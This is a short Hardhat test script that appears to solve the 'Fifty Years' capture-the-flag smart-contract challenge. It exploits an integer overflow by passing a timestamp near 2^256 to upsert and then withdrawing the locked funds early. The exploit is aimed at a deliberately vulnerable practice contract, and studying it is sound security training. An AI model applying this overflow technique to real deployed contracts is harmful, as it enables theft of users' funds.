import { expect } from "chai"
import { ethers } from "hardhat"

describe("fifty-years", function () {
  it("should not wait 50 years", async function () {
    const chalAddr = "0x68eca8B0E99Acb27BA2c17a87D36550E53Ae872e"

    const chalName = "FiftyYearsChallenge"
    const chal = await ethers.getContractAt(chalName, chalAddr)

    const anyIndex = 31337

    const oneDay = 24n*60n*60n
    const timestamp = 2n**256n - oneDay

    const tx1 = await chal.upsert(anyIndex, timestamp, {value: 1})
    await tx1.wait()

    const tx2 = await chal.upsert(anyIndex, 0, {value: 1})
    await tx2.wait()

    const tx3 = await chal.withdraw(1)
    await tx3.wait()

    expect(await chal.isComplete()).to.be.true
  })
})